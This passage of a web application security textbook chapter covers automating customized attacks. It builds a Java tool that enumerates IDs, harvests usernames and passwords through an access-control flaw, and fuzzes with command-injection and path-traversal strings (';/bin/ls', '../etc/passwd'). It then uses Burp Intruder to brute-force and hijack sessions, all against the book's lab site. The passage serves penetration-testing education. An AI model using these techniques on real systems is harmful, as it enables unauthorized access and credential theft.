c14.indd 579 c14.indd 579 8/19/2011 12:15:21 PM 8/19/2011 12:15:21 PM
Stuttard c14.indd V3 - 08/11/2011 Page 580
580 Chapter 14 n Automating Customized Attacks
This confi guration includes the basic target information, creates a single 
request parameter called PageNo, and confi gures our numeric payload source 
to cycle through the range 10060 to 10080.
To cycle through a series of requests, potentially targeting multiple parameters, we need to maintain some state. Let‚Äôs use a simple nextRequest method to 
advance the state of our request engine, returning true until no more requests 
remain:
// attack state
int currentParam = 0;
boolean nextRequest()
{
 if (currentParam >= params.length)
 return false;
 if (!params[currentParam].attack)
 {
 currentParam++;
 return nextRequest();
 }
 if (!payloads.nextPayload())
 {
 payloads.reset();
 currentParam++;
 return nextRequest();
 }
 return true;
}
This stateful request engine keeps track of which parameter we are currently 
targeting and which attack payload to place into it. The next step is to actually 
build a complete HTTP request using this information. This involves inserting 
each type of parameter into the correct place in the request and adding any 
other required headers:
String buildRequest()
{
 // build parameters
 StringBuffer urlParams = new StringBuffer();
 StringBuffer cookieParams = new StringBuffer();
 StringBuffer bodyParams = new StringBuffer();
 for (int i = 0; i < params.length; i++)
 {
 String value = (i == currentParam) ?
 payloads.getPayload() :
 params[i].value;
c14.indd 580 c14.indd 580 8/19/2011 12:15:21 PM 8/19/2011 12:15:21 PM
Stuttard c14.indd V3 - 08/11/2011 Page 581
 Chapter 14 n Automating Customized Attacks 581
 if (params[i].type == Param.Type.URL)
 urlParams.append(params[i].name + ‚Äú=‚Äù + value + ‚Äú&‚Äù);
 else if (params[i].type == Param.Type.COOKIE) 
 cookieParams.append(params[i].name + ‚Äú=‚Äù + value + ‚Äú; ‚Äú);
 else if (params[i].type == Param.Type.BODY) 
 bodyParams.append(params[i].name + ‚Äú=‚Äù + value + ‚Äú&‚Äù);
 }
 // build request
 StringBuffer req = new StringBuffer();
 req.append(method + ‚Äú ‚Äú + url);
 if (urlParams.length() > 0)
 req.append(‚Äú?‚Äù + urlParams.substring(0, urlParams.length() - 1));
 req.append(‚Äú HTTP/1.0\r\nHost: ‚Äú + host);
 if (cookieParams.length() > 0)
 req.append(‚Äú\r\nCookie: ‚Äú + cookieParams.toString());
 if (bodyParams.length() > 0)
 {
 req.append(‚Äú\r\nContent-Type: application/x-www-form-urlencoded‚Äù);
 req.append(‚Äú\r\nContent-Length: ‚Äú + (bodyParams.length() - 1));
 req.append(‚Äú\r\n\r\n‚Äù);
 req.append(bodyParams.substring(0, bodyParams.length() - 1)); 
 }
 else req.append(‚Äú\r\n\r\n‚Äù);
 return req.toString();
}
NOTE If you write your own code to generate POST requests, you need to 
include a valid Content-Length header that specifi es the actual length of the 
HTTP body in each request, as in the preceding code. If an invalid ContentLength is submitted, most web servers either truncate the data you submit or 
wait indefi nitely for more data to be supplied.
To send our requests, we need to open network connections to the target web 
server. Java makes it easy to open a TCP connection, submit data, and read the 
server‚Äôs response:
String issueRequest(String req) throws UnknownHostException, IOException
{
 Socket socket = new Socket(host, port);
 OutputStream os = socket.getOutputStream();
 os.write(req.getBytes());
 os.flush();
 BufferedReader br = new BufferedReader(new InputStreamReader(
 socket.getInputStream()));
 StringBuffer response = new StringBuffer();
c14.indd 581 c14.indd 581 8/19/2011 12:15:21 PM 8/19/2011 12:15:21 PM
Stuttard c14.indd V3 - 08/11/2011 Page 582
582 Chapter 14 n Automating Customized Attacks
 String line;
 while (null != (line = br.readLine()))
 response.append(line);
 os.close();
 br.close();
 return response.toString();
}
Having obtained the server‚Äôs response to each request, we need to parse it to 
extract the relevant information to enable us to identify hits in our attack. Let‚Äôs 
start by simply recording two interesting items ‚Äî the HTTP status code from 
the fi rst line of the response and the total length of the response:
String parseResponse(String response)
{
 StringBuffer output = new StringBuffer();
 output.append(response.split(‚Äú\\s+‚Äù, 3)[1] + ‚Äú\t‚Äù);
 output.append(Integer.toString(response.length()) + ‚Äú\t‚Äù);
 return output.toString();
}
Finally, we now have everything in place to launch our attack. We just need 
some simple wrapper code to call each of the preceding methods in turn and 
print the results until all our requests have been made and nextRequest returns 
false:
void doAttack()
{
 System.out.println(‚Äúparam\tpayload\tstatus\tlength‚Äù);
 String output = null;
 while (nextRequest())
 {
 try
 {
 output = parseResponse(issueRequest(buildRequest()));
 }
 catch (Exception e)
 {
 output = e.toString();
 }
 System.out.println(params[currentParam].name + ‚Äú\t‚Äù +
 payloads.getPayload() + ‚Äú\t‚Äù + output);
 }
}
public static void main(String[] args)
c14.indd 582 c14.indd 582 8/19/2011 12:15:22 PM 8/19/2011 12:15:22 PM
Stuttard c14.indd V3 - 08/11/2011 Page 583
 Chapter 14 n Automating Customized Attacks 583
{
 new JAttack().doAttack();
}
That‚Äôs it! To compile and run this code, you need to download the Java SDK 
and JRE from Sun and then execute the following:
> javac JAttack.java
> java JAttack
In our sample confi guration, the tool‚Äôs output is as follows:
param payload status length
PageNo 10060 500 3154
PageNo 10061 500 3154
PageNo 10062 200 1083
PageNo 10063 200 1080
PageNo 10064 500 3154
...
Assuming a normal network connection and amount of processing power, 
JAttack can issue hundreds of individual requests per minute and output the 
pertinent details. This lets you quickly fi nd valid document identifi ers for further investigation.
TRY IT!
http://mdsec.net/app/
It may appear that the attack just illustrated is no more sophisticated than the 
original bash script example, which required only a few lines of code. However, 
because of how JAttack is engineered, it is easy to modify it to deliver much 
more sophisticated attacks, incorporating multiple request parameters, a variety of payload sources, and arbitrarily complex processing of responses. In the 
following sections, we will make some minor additions to JAttack‚Äôs code that 
will make it considerably more powerful.
Harvesting Useful Data
The second main use of customized automation when attacking an application 
is to extract useful or sensitive data by using specifi c crafted requests to retrieve 
the information one item at a time. This situation most commonly arises when 
you have identifi ed an exploitable vulnerability, such as an access control fl aw, 
that enables you to access an unauthorized resource by specifying an identifi er 
for it. However, it may also arise when the application is functioning entirely as 
c14.indd 583 c14.indd 583 8/19/2011 12:15:22 PM 8/19/2011 12:15:22 PM
Stuttard c14.indd V3 - 08/11/2011 Page 584
584 Chapter 14 n Automating Customized Attacks
intended by its designers. Here are some examples of cases where automated 
data harvesting may be useful:
n An online retailing application contains a facility for registered customers 
to view their pending orders. However, if you can determine the order 
numbers assigned to other customers, you can view their order information in the same way as your own.
n A forgotten password function relies on a user-confi gurable challenge. 
You can submit an arbitrary username and view the associated challenge. 
By iterating through a list of enumerated or guessed usernames, you can 
obtain a large list of users‚Äô password challenges to identify those that are 
easily guessable.
n A work fl ow application contains a function to display some basic account 
information about a given user, including her privilege level within the 
application. By iterating through the range of user IDs in use, you can 
obtain a listing of all administrative users, which can be used as the basis 
for password guessing and other attacks.
The basic approach to using automation to harvest data is essentially similar 
to the enumeration of valid identifi ers, except that you are now not only interested in a binary result (a hit or a miss) but also are seeking to extract some of 
the content of each response in a usable form.
Consider the following request, which is made by a logged-in user to show 
his account information:
GET /auth/498/YourDetails.ashx?uid=198 HTTP/1.1
Host: mdsec.net
Cookie: SessionId=0947F6DC9A66D29F15362D031B337797
Although this application function is accessible only by authenticated users, 
an access control vulnerability exists, which means that any user can view the 
details of any other user by simply modifying the uid parameter. In a further 
vulnerability, the details disclosed also include the user‚Äôs full credentials. Given 
the low value of the uid parameter for our user, it should be easy to predict 
other users‚Äô identifi ers.
When a user‚Äôs details are displayed, the page source contains the personal 
data within an HTML table like the following:
<tr>
 <td>Name: </td><td>Phill Bellend</td>
</tr>
<tr>
 <td>Username: </td><td>phillb</td>
</tr>
c14.indd 584 c14.indd 584 8/19/2011 12:15:22 PM 8/19/2011 12:15:22 PM
Stuttard c14.indd V3 - 08/11/2011 Page 585
 Chapter 14 n Automating Customized Attacks 585
<tr>
 <td>Password: </td><td>b3ll3nd</td>
</tr>
...
Given the application‚Äôs behavior, it is straightforward to mount a customized 
automated attack to harvest all the user information, including credentials, held 
within the application.
To do so, let‚Äôs make some quick enhancements to the JAttack tool to enable 
it to extract and log specifi c data from within the server‚Äôs responses. First, we 
can add to the attack confi guration data a list of the strings within the source 
code that identify the interesting content we want to extract:
static final String[] extractStrings = new String[]
{
 ‚Äú<td>Name: </td><td>‚Äù,
 ‚Äú<td>Username: </td><td>‚Äù,
 ‚Äú<td>Password: </td><td>‚Äù
};
Second, we can add the following to the parseResponse method to search 
each response for each of these strings and extract what comes next, up until 
the angle bracket that follows it:
for (String extract : extractStrings)
{
 int from = response.indexOf(extract);
 if (from == -1)
 continue;
 from += extract.length();
 int to = response.indexOf(‚Äú<‚Äù, from);
 if (to == -1)
 to = response.length();
 output.append(response.subSequence(from, to) + ‚Äú\t‚Äù);
}
That is all we need to change within the tool‚Äôs actual code. To confi gure JAttack 
to target the actual request in which we are interested, we need to update its 
attack confi guration as follows:
String url = ‚Äú/auth/498/YourDetails.ashx‚Äù;
Param[] params = new Param[]
{
 new Param(‚ÄúSessionId‚Äù, ‚Äú0947F6DC9A66D29F15362D031B337797‚Äù, 
 Param.Type.COOKIE, false),
 new Param(‚Äúuid‚Äù, ‚Äú198‚Äù, Param.Type.URL, true),
};
PayloadSource payloads = new PSNumbers(190, 200, 1);
c14.indd 585 c14.indd 585 8/19/2011 12:15:22 PM 8/19/2011 12:15:22 PM
Stuttard c14.indd V3 - 08/11/2011 Page 586
586 Chapter 14 n Automating Customized Attacks
This confi guration instructs JAttack to make requests to the relevant URL 
containing the two required parameters: the cookie containing our current session token, and the vulnerable user identifi er. Only one of these will actually 
be modifi ed, using the range of potential uid numbers specifi ed.
When we now run JAttack, we obtain the following output:
uid 190 500 300
uid 191 200 27489 Adam Matthews sixpack b4dl1ght
uid 192 200 28991 Pablina S pablo puntita5th
uid 193 200 29430 Shawn fattysh gr3ggslu7
uid 194 500 300
uid 195 200 28224 Ruth House ruth_h lonelypu55
uid 196 500 300
uid 197 200 28171 Chardonnay vegasc dangermou5e
uid 198 200 27880 Phill Bellend phillb b3ll3nd
uid 199 200 28901 Paul Byrne byrnsey l33tfuzz
uid 200 200 27388 Peter Weiner weiner skinth1rd
As you can see, the attack was successful and captured the details of some 
users. By widening the numeric range used in the attack, we could extract the 
login information of every user in the application, hopefully including some 
application administrators.
TRY IT!
http://mdsec.net/auth/498/
Note that if you are running the sample JAttack code against this lab example, 
you need to adjust the URL, session cookie, and user ID parameter used 
in your attack confi guration, according to the values you are issued by the 
application.
TIP Data output in tab-delimited format can be easily loaded into spreadsheet software such as Excel for further manipulation or tidying up. In many 
situations, the output from a data-harvesting exercise can be used as the 
input for another automated attack.
Fuzzing for Common Vulnerabilities
The third main use of customized automation does not involve targeting any 
known vulnerability to enumerate or extract information. Rather, your objective 
is to probe the application with various crafted attack strings designed to cause 
anomalous behavior within the application if particular common vulnerabilities 
c14.indd 586 c14.indd 586 8/19/2011 12:15:22 PM 8/19/2011 12:15:22 PM
Stuttard c14.indd V3 - 08/11/2011 Page 587
 Chapter 14 n Automating Customized Attacks 587
are present. This type of attack is much less focused than the ones previously 
described, for the following reasons:
n It generally involves submitting the same set of attack payloads as every 
parameter to every page of the application, regardless of the normal 
function of each parameter or the type of data the application expects to 
receive. These payloads are sometimes called fuzz strings.
n You do not know in advance precisely how to identify hits. Rather than 
monitoring the application‚Äôs responses for a specifi c indicator of success, 
you generally need to capture as much detail as possible in a clear form. 
Then you can easily review this information to identify cases where your 
attack string has triggered some anomalous behavior within the application that merits further investigation.
As you have seen when examining various common web application fl aws, 
some vulnerabilities manifest themselves in the application‚Äôs behavior in 
particular recognizable ways, such as a specifi c error message or HTTP status 
codes. These vulnerability signatures can sometimes be relied on to detect 
common defects, and they are the means by which automated application 
vulnerability scanners identify the majority of their fi ndings (see Chapter 20). 
However, in principle, any test string you submit to the application may give 
rise to any expected behavior that, in its particular context, points toward the 
presence of a vulnerability. For this reason, an experienced attacker using 
customized automated techniques is usually much more effective than any 
fully automated tool can ever be. Such an attacker can perform an intelligent 
analysis of every pertinent detail of the application‚Äôs responses. He can think 
like an application designer and developer. And he can spot and investigate 
unusual connections between requests and responses in a way that no current tool can.
Using automation to facilitate vulnerability discovery is of particular benefi t 
in a large and complex application containing dozens of dynamic pages, each 
of which accepts numerous parameters. Testing every request manually, and 
tracking the pertinent details of the application‚Äôs responses to related requests, 
is nearly impossible. The only practical way to probe such an application is to 
leverage automation to replicate many of the laborious tasks that you would 
otherwise need to perform manually.
Having identifi ed and exploited the broken access controls in the preceding 
example, we could also perform a fuzzing attack to check for various inputbased vulnerabilities. As an initial exploration of the attack surface, we decide 
to submit the following strings in turn within each parameter:
n ‚Äò ‚Äî This generates an error in some instances of SQL injection.
n ;/bin/ls ‚Äî This string causes unexpected behavior in some cases of 
command injection.
c14.indd 587 c14.indd 587 8/19/2011 12:15:22 PM 8/19/2011 12:15:22 PM
Stuttard c14.indd V3 - 08/11/2011 Page 588
588 Chapter 14 n Automating Customized Attacks
n ../../../../../etc/passwd ‚Äî This string causes a different response 
in some cases where a path traversal fl aw exists.
n xsstest ‚Äî If this string is copied into the server‚Äôs response, the application may be vulnerable to cross-site scripting.
We can extend the JAttack tool to generate these payloads by creating a new 
payload source:
class PSFuzzStrings implements PayloadSource
{
 static final String[] fuzzStrings = new String[]
 {
 ‚Äú‚Äô‚Äù, ‚Äú;/bin/ls‚Äù, ‚Äú../../../../../etc/passwd‚Äù, ‚Äúxsstest‚Äù
 };
 int current = -1;
 public boolean nextPayload()
 {
 current++;
 return current < fuzzStrings.length;
 }
 public void reset()
 {
 current = -1;
 }
 public String getPayload()
 {
 return fuzzStrings[current];
 }
}
NOTE Any serious attack to probe the application for security fl aws would 
need to employ many other attack strings to identify other weaknesses and 
other variations on the defects previously mentioned. See Chapter 21 for a 
more comprehensive list of the strings that are effective when fuzzing a web 
application.
To use JAttack for fuzzing, we also need to extend its response analysis code 
to provide more information about each response received from the application. A simple way to greatly enhance this analysis is to search each response 
for a number of common strings and error messages that may indicate that 
some anomalous behavior has occurred, and record any appearance within 
the tool‚Äôs output.
c14.indd 588 c14.indd 588 8/19/2011 12:15:22 PM 8/19/2011 12:15:22 PM
Stuttard c14.indd V3 - 08/11/2011 Page 589
 Chapter 14 n Automating Customized Attacks 589
First, we can add to the attack confi guration data a list of the strings we want 
to search for:
static final String[] grepStrings = new String[]
{
 ‚Äúerror‚Äù, ‚Äúexception‚Äù, ‚Äúillegal‚Äù, ‚Äúquotation‚Äù, ‚Äúnot found‚Äù, ‚Äúxsstest‚Äù
};
Second, we can add the following to the parseResponse method to search 
each response for the preceding strings and log any that are found:
for (String grep : grepStrings)
 if (response.indexOf(grep) != -1)
 output.append(grep + ‚Äú\t‚Äù);
TIP Incorporating this search functionality into JAttack frequently proves 
useful when enumerating identifi ers within the application. It is common to 
fi nd that the most reliable indicator of a hit is the presence or absence of a 
specifi c expression within the application‚Äôs response.
This is all we need to do to create a basic web application fuzzer. To deliver 
the actual attack, we simply need to update our JAttack confi guration to attack 
both parameters to the request and use our fuzz strings as payloads:
String host = ‚Äúmdsec.net‚Äù;
int port = 80;
String method = ‚ÄúGET‚Äù;
String url = ‚Äú/auth/498/YourDetails.ashx‚Äù;
Param[] params = new Param[]
{
 new Param(‚ÄúSessionId‚Äù, ‚ÄúC1F5AFDD7DF969BD1CD2CE40A2E07D19‚Äù, 
 Param.Type.COOKIE, true),
 new Param(‚Äúuid‚Äù, ‚Äú198‚Äù, Param.Type.URL, true),
};
PayloadSource payloads = new PSFuzzStrings();
With this confi guration in place, we can launch our attack. Within a few seconds, JAttack has submitted each attack payload within each parameter of the 
request, which would have taken several minutes at least to issue manually. It also 
would have taken far longer to review and analyze the raw responses received.
The next task is to manually inspect the output from JAttack and attempt to 
identify any anomalous results that may indicate the presence of a vulnerability:
param payload status length
SessionId ‚Äò 302 502
SessionId ;/bin/ls 302 502
c14.indd 589 c14.indd 589 8/19/2011 12:15:22 PM 8/19/2011 12:15:22 PM
Stuttard c14.indd V3 - 08/11/2011 Page 590
590 Chapter 14 n Automating Customized Attacks
SessionId ../../../../../../etc/passwd 302 502
SessionId xsstest 302 502
uid ‚Äò 200 2941 exception quotation
uid ;/bin/ls 200 2895 exception
uid ../../../../../../etc/passwd 200 2915 exception
uid xsstest 200 2898 exception xsstest
In requests that modify the SessionId parameter, the application responds 
with a redirection response that always has the same length. This behavior does 
not indicate any vulnerability. This is unsurprising, since modifying the session token while logged in typically invalidates the current session and causes 
a redirection to the login.
The uid parameter is more interesting. All the modifi cations to this parameter 
cause a response containing the string exception. The responses are variable 
in length, indicating that the different payloads result in different responses, so 
this is probably not just a generic error message. Going further, we can see that 
when a single quotation mark is submitted, the application‚Äôs response contains 
the string quotation, which is likely to be part of a SQL error message. This 
could be a SQL injection fl aw, and we should manually investigate to confi rm 
this (see Chapter 9). In addition, we can see that the payload xsstest is being 
echoed in the application‚Äôs response. We should probe this behavior further to 
determine whether the error message can be leveraged to perform a cross-site 
scripting attack (see Chapter 12).
TRY IT!
http://mdsec.net/auth/498/
Putting It All Together: Burp Intruder
The JAttack tool consists of fewer than 250 lines of simple code, yet in a few 
seconds, it uncovered at least two potentially serious security vulnerabilities 
while fuzzing a single request to an application.
Nevertheless, despite its power, as soon as you start to use a tool such as 
JAttack to deliver automated customized attacks, you will quickly identify 
additional functionality that would make it even more helpful. As it stands, you 
need to confi gure every targeted request within the tool‚Äôs source code and then 
recompile it. It would be better to read this information from a confi guration 
fi le and dynamically construct the attack at runtime. In fact, it would be much 
c14.indd 590 c14.indd 590 8/19/2011 12:15:22 PM 8/19/2011 12:15:22 PM
Stuttard c14.indd V3 - 08/11/2011 Page 591
 Chapter 14 n Automating Customized Attacks 591
better to have a nice user interface that lets you confi gure each of the attacks 
described in a few seconds.
There are many situations in which you need more fl exibility in how payloads 
are generated, requiring many more advanced payload sources than the ones 
we have created. You will also often need support for SSL, HTTP authentication, multithreaded requests, automatic following of redirections, and automatic 
encoding of unusual characters within payloads. There are situations in which 
modifying a single parameter at a time would be too restrictive. You will want 
to inject one payload source into one parameter and a different source into 
another. It would be good to store all the application‚Äôs responses for easy reference so that you can immediately inspect an interesting response to understand 
what is happening, and even tinker with the corresponding request manually 
and reissue it. As well as modifying and issuing a single request repeatedly, in 
some situations you need to handle multistage processes, application sessions, 
and per-request tokens. It would also be nice to integrate the tool with other 
useful tools such as a proxy and a spider, avoiding the need to cut and paste 
information back and forth.
Burp Intruder is a unique tool that implements all this functionality. It is 
designed specifi cally to enable you to perform all kinds of customized automated attacks with a minimum of confi guration and to present the results 
in a rich amount of detail, enabling you to quickly hone in on hits and other 
anomalous test cases. It is also fully integrated with the other Burp Suite 
tools. For example, you can trap a request in the proxy, pass this to Intruder 
to be fuzzed, and pass interesting results to Repeater to confi rm and exploit 
all kinds of vulnerabilities.
We will describe the basic functions and confi guration of Burp Intruder and 
then look at some examples of its use in performing customized automated 
attacks.
Positioning Payloads
Burp Intruder uses a conceptual model similar to the one JAttack uses, based 
on positioning payloads at specifi c points within a request, and one or more 
payload sources. However, Intruder is not restricted to inserting payload strings 
into the values of the actual request parameters. Payloads can be positioned at 
a subpart of a parameter‚Äôs value, or at a parameter‚Äôs name, or indeed anywhere 
at all within a request‚Äôs headers or body.
Having identifi ed a particular request to use as the basis for the attack, each 
payload position is defi ned using a pair of markers to indicate the start and end 
of the payload‚Äôs insertion point, as shown in Figure 14-1.
c14.indd 591 c14.indd 591 8/19/2011 12:15:22 PM 8/19/2011 12:15:22 PM
Stuttard c14.indd V3 - 08/11/2011 Page 592
592 Chapter 14 n Automating Customized Attacks
Figure 14-1: Positioning payloads
When a payload is inserted at a particular position, any text between the 
markers is overwritten with the payload. When a payload is not being inserted, 
the text between the markers is submitted instead. This is necessary in order to 
test one parameter at a time, leaving others unmodifi ed, as when performing 
application fuzzing. Clicking the Auto button makes Intruder set payload positions at the values of all URL, cookie, and body parameters, thereby automating 
a tedious task that was done manually in JAttack.
The sniper attack type is the one you will need most frequently. It functions 
in the same way as JAttack‚Äôs request engine, targeting one payload position at 
a time, submitting all payloads at that position, and then moving to the next 
position. Other attack types enable you to target multiple positions simultaneously in different ways, using multiple payload sets.
Choosing Payloads
The next step in preparing an attack is to choose the set of payloads to be 
inserted at the defi ned positions. Intruder contains numerous built-in functions 
for generating attack payloads, including the following:
c14.indd 592 c14.indd 592 8/19/2011 12:15:22 PM 8/19/2011 12:15:22 PM
Stuttard c14.indd V3 - 08/11/2011 Page 593
 Chapter 14 n Automating Customized Attacks 593
n Lists of preset and confi gurable items.
n Custom iteration of payloads based on any syntactic scheme. For example, 
if the application uses usernames of the form ABC45D, the custom iterator 
can be used to cycle through the range of all possible usernames.
n Character and case substitution. From a starting list of payloads, Intruder 
can modify individual characters and their case to generate variations. 
This can be useful when brute-forcing passwords. For example, the string 
password can be modifi ed to become p4ssword, passw0rd, Password,
PASSWORD, and so on.
n Numbers, which can be used to cycle through document IDs, session 
tokens, and so on. Numbers can be created in decimal or hexadecimal, as 
integers or fractions, sequentially, in stepped increments, or randomly. 
Producing random numbers within a defi ned range can be useful when 
searching for hits when you have an idea of how large some valid values 
are but have not identifi ed any reliable pattern for extrapolating these.
n Dates, which can be used in the same way as numbers in some situations. 
For example, if a login form requires a date of birth to be entered, this function can be used to brute-force all the valid dates within a specifi ed range.
n Illegal Unicode encodings, which can be used to bypass some input fi lters 
by submitting alternative encodings of malicious characters.
n Character blocks, which can be used to probe for buffer overfl ow vulnerabilities (see Chapter 16).
n A brute-forcer function, which can be used to generate all the permutations of a particular character set in a specifi c range of lengths. Using this 
function is a last resort in most situations because of the huge number 
of requests it generates. For example, brute-forcing all possible six-digit 
passwords containing only lowercase alphabetical characters produces 
more than three million permutations ‚Äî more than can practically be 
tested with only remote access to the application.
n ‚ÄúCharacter frobber‚Äù and ‚Äúbit fl ipper‚Äù functions, which can be used to 
systematically manipulate parts of a parameter‚Äôs existing value to probe 
the application‚Äôs handling of subtle modifi cations (see Chapter 7).
In addition to the payload generation functions, you can confi gure rules to 
perform arbitrary processing on each payload‚Äôs value before it is used. This 
includes string and case manipulation, encoding and decoding in various 
schemes, and hashing. Doing so enables you to build effective payloads in many 
kinds of unusual situations.
c14.indd 593 c14.indd 593 8/19/2011 12:15:23 PM 8/19/2011 12:15:23 PM
Stuttard c14.indd V3 - 08/11/2011 Page 594
594 Chapter 14 n Automating Customized Attacks
Burp Intruder by default URL-encodes any characters that might invalidate 
your request if placed into the request in their literal form.
Confi guring Response Analysis
For many kinds of attacks, you should identify the attributes of the server‚Äôs 
responses that you are interested in analyzing. For example, when enumerating 
identifi ers, you may need to search each response for a specifi c string. When 
fuzzing, you may want to scan for a large number of common error messages 
and the like.
By default, Burp Intruder records in its table of results the HTTP status code, 
the response length, any cookies set by the server, and the time taken to receive 
the response. As with JAttack, you can additionally confi gure Burp Intruder to 
perform some custom analysis of the application‚Äôs responses to help identify 
interesting cases that may indicate the presence of a vulnerability or merit further investigation. You can specify strings or regex expressions that responses 
will be searched for. You can set customized strings to control extraction of data 
from the server‚Äôs responses. And you can make Intruder check whether each 
response contains the attack payload itself to help identify cross-site scripting 
and other response injection vulnerabilities. These settings can be confi gured 
before each attack is launched and can also be applied to the attack results after 
the attack has started.
Having confi gured payload positions, payload sources, and any required 
analysis of server responses, you are ready to launch your attack. Let‚Äôs take a 
quick look at how Intruder can be used to deliver some common customized 
automated attacks.
Attack 1: Enumerating Identifi ers
Suppose that you are targeting an application that supports self-registration for 
anonymous users. You create an account, log in, and gain access to a minimum 
of functionality. At this stage, one area of obvious interest is the application‚Äôs 
session tokens. Logging in several times in close succession generates the following sequence:
000000-fb2200-16cb12-172ba72551
000000-bc7192-16cb12-172ba7279e
000000-73091f-16cb12-172ba729e8
000000-918cb1-16cb12-172ba72a2a
000000-aa820f-16cb12-172ba72b58
000000-bc8710-16cb12-172ba72e2b
c14.indd 594 c14.indd 594 8/19/2011 12:15:23 PM 8/19/2011 12:15:23 PM
Stuttard c14.indd V3 - 08/11/2011 Page 595
 Chapter 14 n Automating Customized Attacks 595
You follow the steps described in Chapter 7 to analyze these tokens. It is evident 
that approximately half of the token is not changing, but you also discover that 
the second portion of the token is not actually processed by the application either. 
Modifying this portion entirely does not invalidate your tokens. Furthermore, 
although it is not trivially sequential, the fi nal portion clearly appears to be 
incrementing in some fashion. This looks like a promising opportunity for a 
session hijacking attack.
To leverage automation to deliver this attack, you need to fi nd a single request/
response pair that can be used to detect valid tokens. Typically, any request for 
an authenticated page of the application will serve this purpose. You decide to 
target the page presented to each user following login:
GET /auth/502/Home.ashx HTTP/1.1
Host: mdsec.net
Cookie: SessionID=000000-fb2200-16cb12-172ba72551
Because of what you know about the structure and handling of session tokens, 
your attack needs to modify only the fi nal portion of the token. In fact, because 
of the sequence identifi ed, the most productive initial attack modifi es only the 
last few digits of the token. Accordingly, you confi gure Intruder with a single 
payload position, as shown in Figure 14-2.
Figure 14-2: Setting a custom payload position
c14.indd 595 c14.indd 595 8/19/2011 12:15:23 PM 8/19/2011 12:15:23 PM
Stuttard c14.indd V3 - 08/11/2011 Page 596
596 Chapter 14 n Automating Customized Attacks
Your payloads need to sequence through all possible values for the fi nal three 
digits. The token appears to use the same character set as hexadecimal numbers: 
0 to 9 and a to f. So you confi gure a payload source to generate all hexadecimal 
numbers in the range 0x000 to 0xfff, as shown in Figure 14-3.
Figure 14-3: Configuring numeric payloads
In attacks to enumerate valid session tokens, identifying hits is typically 
straightforward. In the present case you have determined that the application 
returns an HTTP 200 response when a valid token is supplied and an HTTP 302 
redirect to the login page when an invalid token is supplied. Hence, you don‚Äôt 
need to confi gure any custom response analysis for this attack.
Launching the attack causes Intruder to quickly iterate through the requests. 
The attack results are displayed in the form of a table. You can click each 
column heading to sort the results according to the contents of that column. 
Sorting by status code enables you to easily identify the valid tokens you have 
discovered, as shown in Figure 14-4. You can also use the fi ltering and search 
functions within the results window to help locate interesting items within 
a large set of results.
c14.indd 596 c14.indd 596 8/19/2011 12:15:23 PM 8/19/2011 12:15:23 PM
Stuttard c14.indd V3 - 08/11/2011 Page 597
 Chapter 14 n Automating Customized Attacks 597
Figure 14-4: Sorting attack results to quickly identify hits
The attack is successful. You can take any of the payloads that caused HTTP 
200 responses, replace the last three digits of your session token with this, and 
thereby hijack the sessions of other application users. However, take a closer look 
at the table of results. Most of the HTTP 200 responses have roughly the same 
response length, because the home page presented to different users is more or 
less the same. However, two of the responses are much longer, indicating that 
a different home page was returned.
You can double-click a result item in Intruder to display the server‚Äôs response 
in full, either as raw HTTP or rendered as HTML. Doing this reveals that the 
longer home pages contain more menu options and different details than your 
home page does. It appears that these two hijacked sessions belong to moreprivileged users.
TRY IT!
http://mdsec.net/auth/502/
c14.indd 597 c14.indd 597 8/19/2011 12:15:23 PM 8/19/2011 12:15:23 PM
Stuttard c14.indd V3 - 08/11/2011 Page 598
598 Chapter 14 n Automating Customized Attacks
TIP The response length frequently is a strong indicator of anomalous 
responses that merit further investigation. As in the preceding case, a different response length can point to interesting differences that you may not 
have anticipated when you devised the attack. Therefore, even if another 
attribute provides a reliable indicator of hits, such as the HTTP status code, 
you should always inspect the response length column to identify other 
interesting responses.
Attack 2: Harvesting Information
Browsing further into the authenticated area of the application, you notice that 
it uses an index number in a URL parameter to identify functions requested 
by the user. For example, the following URL is used to display the My Details 
page for the current user:
https://mdsec.net/auth/502/ShowPage.ashx?pageid=32010039
This behavior offers a prime opportunity to trawl for functionality you have 
not yet discovered and for which you may not be properly authorized. To do 
this, you can use Burp Intruder to cycle through a range of possible pageid
values and extract the title of each page that is found.
In this situation, it is often sensible to begin trawling for content within a 
numeric range that is known to contain valid values. To do this, you can set 
your payload position markers to target the fi nal two digits of the pageid, as 
shown in Figure 14-5, and generate payloads in the range 00 to 99.
You can confi gure Intruder to capture the page title from each response 
using the Extract Grep function. This works much like the extract function of 
JAttack ‚Äî you specify the expression that precedes the item you want to extract, 
as shown in Figure 14-6.
Launching this attack quickly iterates through all the possible values for 
the last two digits of the pageid parameter and shows the page title from each 
response, as shown in Figure 14-7. As you can see, several responses appear 
to contain interesting administrative functionality. Furthermore, some of the 
responses are redirections to a different URL, which warrant further investigation. If you want to, you can reconfi gure your Intruder attack to extract the 
target of these directions, or even to automatically follow them and show the 
page title from the eventual response.
TRY IT!
http://mdsec.net/auth/502/
c14.indd 598 c14.indd 598 8/19/2011 12:15:23 PM 8/19/2011 12:15:23 PM
Stuttard c14.indd V3 - 08/11/2011 Page 599
 Chapter 14 n Automating Customized Attacks 599
Figure 14-5: Positioning the payload
Figure 14-6: Configuring Extract Grep
c14.indd 599 c14.indd 599 8/19/2011 12:15:23 PM 8/19/2011 12:15:23 PM
Stuttard c14.indd V3 - 08/11/2011 Page 600
600 Chapter 14 n Automating Customized Attacks
Figure 14-7: Cycling through function index values and extracting the title 
of each resulting page
Attack 3: Application Fuzzing
In addition to exploiting the bugs already identifi ed, you should, of course, probe 
the target application for common vulnerabilities. To ensure decent coverage, 
you should test every parameter and request, starting from the login request 
onward.
To perform a quick fuzz test of a given request, you need to set payload positions at all the request parameters. You can do this simply by clicking the auto 
button on the positions tab, as shown in Figure 14-8.
You then need to confi gure a set of attack strings to use as payloads and some 
common error messages to search responses for. Intruder contains built-in sets 
of strings for both of these uses.
As with the fuzzing attack performed using JAttack, you then need to manually 
review the table of results to identify any anomalies that merit further investigation, as shown in Figure 14-9. As before, you can click column headings to sort 
the responses in various ways to help identify interesting cases.
c14.indd 600 c14.indd 600 8/19/2011 12:15:24 PM 8/19/2011 12:15:24 PM
Stuttard c14.indd V3 - 08/11/2011 Page 601
 Chapter 14 n Automating Customized Attacks 601
Figure 14-8: Configuring Burp Intruder to fuzz a login request
Figure 14-9: Results from fuzzing a single request
c14.indd 601 c14.indd 601 8/19/2011 12:15:24 PM 8/19/2011 12:15:24 PM
Stuttard c14.indd V3 - 08/11/2011 Page 602
602 Chapter 14 n Automating Customized Attacks
From an initial look at the results, it appears that the application is vulnerable 
to SQL injection. In both payload positions, when a single quotation mark is 
